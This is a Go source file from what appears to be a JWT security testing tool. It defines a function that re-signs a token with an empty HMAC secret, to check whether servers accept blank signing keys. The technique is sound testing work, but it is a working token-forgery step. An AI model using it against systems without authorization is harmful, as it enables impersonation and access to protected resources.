package exploit

import (
	"fmt"

	"github.com/cerberauth/jwtop/jwt/editor"
)

// BlankSecret re-signs the token with an empty HMAC secret ("").
// A server that accepts this token is configured with a blank signing key,
// or does not enforce a minimum secret length.
//
// Returns an error if the token is malformed. Unlike the crack package this
// function does not validate that the original token uses an HMAC algorithm
// â€” re-signing with an empty key for a non-HMAC method will simply fail with
// a key-type error from the underlying jwt library.
func BlankSecret(tokenString string) (string, error) { //nolint:gosec
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return "", fmt.Errorf("parsing token: %w", err)
	}
	result, err := te.SignWithKey([]byte(""))
	if err != nil {
		return "", fmt.Errorf("signing with blank secret: %w", err)
	}
	return result, nil
}
